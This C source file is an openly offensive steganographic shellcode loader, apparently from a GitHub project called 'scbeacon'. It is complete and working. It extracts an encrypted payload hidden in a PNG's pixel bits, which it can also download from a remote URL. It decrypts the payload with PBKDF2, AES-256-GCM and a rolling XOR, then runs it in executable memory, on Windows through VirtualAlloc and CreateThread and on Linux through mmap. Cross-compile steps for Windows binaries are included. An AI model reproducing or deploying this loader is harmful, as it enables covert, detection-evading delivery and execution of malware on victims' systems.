/*
 * Author : https://github.com/kcnewb1e/scbeacon
 * stego_loader.c - Extract and execute shellcode from LSB stego PNG
 *                  Multi-layer decryption: AES-256-GCM -> Rolling-XOR
 *
 * Dependencies: OpenSSL (libssl, libcrypto)
 *
 * Compile Linux (local only):
 *   gcc -O2 -s stego_loader.c -lm -lssl -lcrypto -o loader
 *
 * Compile Linux (with HTTP support):
 *   gcc -O2 -s stego_loader.c -lm -lssl -lcrypto -lcurl -DUSE_CURL -o loader
 *
 * Compile Windows (cross from Kali):
 *   sudo apt install gcc-mingw-w64 libssl-dev
 *   x86_64-w64-mingw32-gcc -O2 -s stego_loader.c -lm -lwininet -lssl -lcrypto -o loader.exe
 *
 * Usage:
 *   ./loader image.png "password"
 *   ./loader http://example.com/image.png "password"
 */

#define STB_IMAGE_IMPLEMENTATION
#include "stb_image.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* ── Platform-specific includes ─────────────────────────────────────────── */
#ifdef _WIN32
    #include <windows.h>
    #include <wininet.h>
    #include <bcrypt.h>
    #pragma comment(lib, "wininet.lib")
    #pragma comment(lib, "bcrypt.lib")
    #ifndef BCRYPT_SUCCESS
        #define BCRYPT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
    #endif
#else
    #include <sys/mman.h>
    #include <openssl/evp.h>
    #ifdef USE_CURL
        #include <curl/curl.h>
    #endif
#endif

/* ── Constants ──────────────────────────────────────────────────────────── */
static const uint8_t MAGIC[4] = {0xDE, 0xAD, 0xC0, 0xDE};

/* Fixed header: MAGIC(4) + SALT_LEN(2) + NONCE_LEN(2) + PAYLOAD_LEN(4) = 12 bytes */
#define FIXED_HEADER_LEN  12
#define DEFAULT_BASE_KEY  0xAB
#define KDF_ITERATIONS    200000
#define AES_KEY_LEN       32    /* AES-256 */
#define GCM_TAG_LEN       16

/* ── LSB extraction helper ──────────────────────────────────────────────── */
static void extract_bytes(const uint8_t *channels, size_t bit_pos,
                           uint8_t *out, size_t n_bytes)
{
    for (size_t b = 0; b < n_bytes; b++) {
        uint8_t byte = 0;
        for (int bit = 7; bit >= 0; bit--)
            byte |= (channels[bit_pos++] & 1) << bit;
        out[b] = byte;
    }
}

/* ══════════════════════════════════════════════════════════════════════════
 * Crypto backend — Windows uses CNG (Bcrypt, built-in), Linux uses OpenSSL
 * ══════════════════════════════════════════════════════════════════════════ */

#ifdef _WIN32
/* ── Windows CNG: PBKDF2-SHA256 ─────────────────────────────────────────── */
static int derive_keys(const char *password, const uint8_t *salt, int salt_len,
                       uint8_t *aes_key, uint8_t *xor_key_out)
{
    uint8_t key_material[AES_KEY_LEN + 1];
    BCRYPT_ALG_HANDLE hAlg = NULL;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL,
                                 BCRYPT_ALG_HANDLE_HMAC_FLAG);

    NTSTATUS st = BCryptDeriveKeyPBKDF2(
        hAlg,
        (PUCHAR)password, (ULONG)(strlen(password) * sizeof(char)),
        (PUCHAR)salt,     (ULONG)salt_len,
        KDF_ITERATIONS,
        key_material,     (ULONG)sizeof(key_material),
        0
    );
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(st)) {
        fprintf(stderr, "[-] BCryptDeriveKeyPBKDF2 failed: 0x%lx\n", st);
        return 0;
    }

    memcpy(aes_key, key_material, AES_KEY_LEN);
    *xor_key_out = key_material[AES_KEY_LEN] ^ DEFAULT_BASE_KEY;
    return 1;
}

/* ── Windows CNG: AES-256-GCM decrypt ───────────────────────────────────── */
static uint8_t *aes_gcm_decrypt(const uint8_t *aes_key,
                                  const uint8_t *nonce, int nonce_len,
                                  const uint8_t *ciphertext, size_t ct_len,
                                  size_t *out_len)
{
    if (ct_len < GCM_TAG_LEN) {
        fprintf(stderr, "[-] Ciphertext too short for GCM tag\n");
        return NULL;
    }

    size_t enc_len = ct_len - GCM_TAG_LEN;
    uint8_t tag_copy[GCM_TAG_LEN];
    memcpy(tag_copy, ciphertext + enc_len, GCM_TAG_LEN);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                (PUCHAR)aes_key, AES_KEY_LEN, 0);

    uint8_t *plaintext = malloc(enc_len + 1);
    if (!plaintext) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg,0); return NULL; }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = (ULONG)nonce_len;
    authInfo.pbTag   = tag_copy;
    authInfo.cbTag   = GCM_TAG_LEN;

    ULONG cbResult = 0;
    NTSTATUS st = BCryptDecrypt(
        hKey,
        (PUCHAR)ciphertext, (ULONG)enc_len,
        &authInfo,
        NULL, 0,
        plaintext, (ULONG)enc_len,
        &cbResult, 0
    );

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(st)) {
        fprintf(stderr, "[-] AES-GCM decryption failed (wrong password?)\n");
        free(plaintext);
        return NULL;
    }

    *out_len = cbResult;
    return plaintext;
}

#else  /* Linux — OpenSSL */

/* ── Linux OpenSSL: PBKDF2-SHA256 ───────────────────────────────────────── */
static int derive_keys(const char *password, const uint8_t *salt, int salt_len,
                       uint8_t *aes_key, uint8_t *xor_key_out)
{
    uint8_t key_material[AES_KEY_LEN + 1];
    int ok = PKCS5_PBKDF2_HMAC(
        password, (int)strlen(password),
        salt, salt_len,
        KDF_ITERATIONS,
        EVP_sha256(),
        (int)sizeof(key_material),
        key_material
    );
    if (!ok) return 0;
    memcpy(aes_key, key_material, AES_KEY_LEN);
    *xor_key_out = key_material[AES_KEY_LEN] ^ DEFAULT_BASE_KEY;
    return 1;
}

/* ── Linux OpenSSL: AES-256-GCM decrypt ─────────────────────────────────── */
/* ciphertext = encrypted_data || 16-byte GCM tag (Python cryptography format) */
static uint8_t *aes_gcm_decrypt(const uint8_t *aes_key,
                                  const uint8_t *nonce, int nonce_len,
                                  const uint8_t *ciphertext, size_t ct_len,
                                  size_t *out_len)
{
    if (ct_len < GCM_TAG_LEN) {
        fprintf(stderr, "[-] Ciphertext too short for GCM tag\n");
        return NULL;
    }

    size_t enc_len     = ct_len - GCM_TAG_LEN;
    const uint8_t *tag = ciphertext + enc_len;

    uint8_t *plaintext = malloc(enc_len + 1);
    if (!plaintext) return NULL;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, nonce_len, NULL);
    EVP_DecryptInit_ex(ctx, NULL, NULL, aes_key, nonce);

    int len = 0;
    EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, (int)enc_len);
    *out_len = (size_t)len;

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, GCM_TAG_LEN, (void *)tag);
    int final_len = 0;
    int ok = EVP_DecryptFinal_ex(ctx, plaintext + len, &final_len);
    EVP_CIPHER_CTX_free(ctx);

    if (ok <= 0) {
        fprintf(stderr, "[-] AES-GCM decryption failed (wrong password?)\n");
        free(plaintext);
        return NULL;
    }

    *out_len += (size_t)final_len;
    return plaintext;
}

#endif  /* _WIN32 / Linux crypto backend */

/* ── Crypto: Rolling-XOR decrypt ────────────────────────────────────────── */
static void rolling_xor_decrypt(uint8_t *data, size_t len, uint8_t key)
{
    uint8_t k = key;
    for (size_t i = 0; i < len; i++) {
        uint8_t enc = data[i];
        data[i]     = enc ^ k;
        /* Mirror encoder's key evolution: k = k ^ out[i] ^ (i & 0xFF)
           where out[i] = enc (the encrypted byte) */
        k = (k ^ enc ^ (uint8_t)(i & 0xFF)) & 0xFF;
    }
}

/* ── Core: extract + decrypt shellcode from pixel data ──────────────────── */
static uint8_t *extract_shellcode(const uint8_t *pixels, int width, int height,
                                   const char *password, size_t *sc_len)
{
    size_t total_channels = (size_t)width * height * 3;

    if (total_channels < (size_t)FIXED_HEADER_LEN * 8) {
        fprintf(stderr, "[-] Image too small for header\n");
        return NULL;
    }

    size_t bit_pos = 0;

    /* MAGIC (4 bytes) */
    uint8_t magic[4];
    extract_bytes(pixels, bit_pos, magic, 4); bit_pos += 32;
    if (memcmp(magic, MAGIC, 4) != 0) {
        fprintf(stderr, "[-] Magic not found. Wrong image or no payload.\n");
        return NULL;
    }

    /* SALT_LEN (2 bytes, LE) */
    uint8_t tmp2[2];
    extract_bytes(pixels, bit_pos, tmp2, 2); bit_pos += 16;
    uint16_t salt_len = (uint16_t)(tmp2[0] | (tmp2[1] << 8));

    /* NONCE_LEN (2 bytes, LE) */
    extract_bytes(pixels, bit_pos, tmp2, 2); bit_pos += 16;
    uint16_t nonce_len = (uint16_t)(tmp2[0] | (tmp2[1] << 8));

    /* PAYLOAD_LEN (4 bytes, LE) */
    uint8_t tmp4[4];
    extract_bytes(pixels, bit_pos, tmp4, 4); bit_pos += 32;
    uint32_t payload_len;
    memcpy(&payload_len, tmp4, 4);

    printf("[*] Ciphertext size: %u bytes\n", payload_len);
    printf("[*] Salt len       : %u | Nonce len: %u\n", salt_len, nonce_len);

    /* Sanity check */
    size_t total_bytes = FIXED_HEADER_LEN + salt_len + nonce_len + payload_len;
    if (payload_len == 0 || total_bytes * 8 > total_channels) {
        fprintf(stderr, "[-] Invalid payload length\n");
        return NULL;
    }

    /* SALT */
    uint8_t *salt = malloc(salt_len);
    extract_bytes(pixels, bit_pos, salt, salt_len); bit_pos += salt_len * 8;

    /* NONCE */
    uint8_t *nonce = malloc(nonce_len);
    extract_bytes(pixels, bit_pos, nonce, nonce_len); bit_pos += nonce_len * 8;

    /* CIPHERTEXT */
    uint8_t *ciphertext = malloc(payload_len);
    extract_bytes(pixels, bit_pos, ciphertext, payload_len);

    /* Print salt/nonce for verification */
    printf("[*] Salt           : ");
    for (int i = 0; i < salt_len; i++) printf("%02x", salt[i]);
    printf("\n[*] Nonce          : ");
    for (int i = 0; i < nonce_len; i++) printf("%02x", nonce[i]);
    printf("\n");

    /* Derive AES key + XOR key */
    uint8_t aes_key[AES_KEY_LEN];
    uint8_t xor_key;
    if (!derive_keys(password, salt, salt_len, aes_key, &xor_key)) {
        fprintf(stderr, "[-] Key derivation failed\n");
        free(salt); free(nonce); free(ciphertext);
        return NULL;
    }
    free(salt);

    /* Layer 2 decrypt: AES-256-GCM */
    size_t plain_len = 0;
    uint8_t *step1 = aes_gcm_decrypt(aes_key, nonce, nonce_len,
                                      ciphertext, payload_len, &plain_len);
    free(nonce); free(ciphertext);
    if (!step1) return NULL;

    /* Layer 1 decrypt: Rolling XOR */
    rolling_xor_decrypt(step1, plain_len, xor_key);

    printf("[+] Shellcode extracted: %zu bytes\n", plain_len);
    *sc_len = plain_len;
    return step1;
}

/* ── Image loading: from file ───────────────────────────────────────────── */
static uint8_t *load_from_file(const char *path, int *w, int *h) {
    printf("[*] Reading image: %s\n", path);
    int channels;
    uint8_t *pixels = stbi_load(path, w, h, &channels, 3);
    if (!pixels)
        fprintf(stderr, "[-] Failed to load image: %s\n", stbi_failure_reason());
    return pixels;
}

/* ── Image loading: from HTTP URL ───────────────────────────────────────── */

#ifdef _WIN32
static uint8_t *load_from_url(const char *url, int *w, int *h) {
    printf("[*] Fetching: %s\n", url);

    HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT,
                                     NULL, NULL, 0);
    if (!hInet) { fprintf(stderr, "[-] InternetOpen failed\n"); return NULL; }

    HINTERNET hUrl = InternetOpenUrlA(hInet, url, NULL, 0,
                                       INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        fprintf(stderr, "[-] InternetOpenUrl failed\n");
        InternetCloseHandle(hInet);
        return NULL;
    }

    /* Read response into dynamic buffer */
    size_t buf_size = 0, cap = 65536;
    uint8_t *buf = malloc(cap);
    DWORD read;
    while (InternetReadFile(hUrl, buf + buf_size, (DWORD)(cap - buf_size), &read) && read > 0) {
        buf_size += read;
        if (buf_size + 4096 > cap) {
            cap *= 2;
            buf = realloc(buf, cap);
        }
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInet);

    int channels;
    uint8_t *pixels = stbi_load_from_memory(buf, (int)buf_size, w, h, &channels, 3);
    free(buf);
    if (!pixels)
        fprintf(stderr, "[-] Failed to decode image: %s\n", stbi_failure_reason());
    return pixels;
}

#elif defined(USE_CURL)
typedef struct { uint8_t *data; size_t size; } MemBuf;

static size_t curl_write_cb(void *ptr, size_t size, size_t nmemb, MemBuf *buf) {
    size_t chunk = size * nmemb;
    buf->data = realloc(buf->data, buf->size + chunk);
    memcpy(buf->data + buf->size, ptr, chunk);
    buf->size += chunk;
    return chunk;
}

static uint8_t *load_from_url(const char *url, int *w, int *h) {
    printf("[*] Fetching: %s\n", url);
    MemBuf buf = {NULL, 0};

    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        fprintf(stderr, "[-] curl error: %s\n", curl_easy_strerror(res));
        free(buf.data);
        return NULL;
    }

    int channels;
    uint8_t *pixels = stbi_load_from_memory(buf.data, (int)buf.size, w, h, &channels, 3);
    free(buf.data);
    if (!pixels)
        fprintf(stderr, "[-] Failed to decode image: %s\n", stbi_failure_reason());
    return pixels;
}

#else
static uint8_t *load_from_url(const char *url, int *w, int *h) {
    (void)url; (void)w; (void)h;
    fprintf(stderr, "[-] HTTP not supported. Recompile with -DUSE_CURL -lcurl\n");
    return NULL;
}
#endif

/* ── Execution ──────────────────────────────────────────────────────────── */
#ifdef _WIN32
static int execute(uint8_t *sc, size_t len) {
    LPVOID ptr = VirtualAlloc(NULL, len,
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    if (!ptr) {
        fprintf(stderr, "[-] VirtualAlloc failed: %lu\n", GetLastError());
        return 0;
    }

    RtlMoveMemory(ptr, sc, len);

    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr,
                                  NULL, 0, NULL);
    if (!thread) {
        fprintf(stderr, "[-] CreateThread failed: %lu\n", GetLastError());
        return 0;
    }

    printf("[+] Thread created, executing...\n");
    WaitForSingleObject(thread, INFINITE);
    return 1;
}

#else
static int execute(uint8_t *sc, size_t len) {
    void *ptr = mmap(NULL, len,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS,
                     -1, 0);
    if (ptr == MAP_FAILED) {
        perror("[-] mmap");
        return 0;
    }

    memcpy(ptr, sc, len);

    printf("[+] Executing shellcode...\n");
    ((void (*)(void))ptr)();
    return 1;
}
#endif

/* ── Entry point ────────────────────────────────────────────────────────── */
int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <image.png|http://...> <password>\n", argv[0]);
        return 1;
    }

    const char *source   = argv[1];
    const char *password = argv[2];

    printf("[*] Decryption     : AES-256-GCM -> Rolling-XOR\n");
    printf("[*] KDF iterations : %d\n", KDF_ITERATIONS);

    /* Load image */
    int width, height;
    uint8_t *pixels = NULL;

    if (strncmp(source, "http://", 7) == 0 || strncmp(source, "https://", 8) == 0)
        pixels = load_from_url(source, &width, &height);
    else
        pixels = load_from_file(source, &width, &height);

    if (!pixels) return 1;

    printf("[*] Image size     : %dx%d\n", width, height);

    /* Extract + decrypt shellcode */
    size_t sc_len = 0;
    uint8_t *shellcode = extract_shellcode(pixels, width, height, password, &sc_len);
    stbi_image_free(pixels);

    if (!shellcode) return 1;

    /* Execute */
    int ok = execute(shellcode, sc_len);
    free(shellcode);
    return ok ? 0 : 1;
}
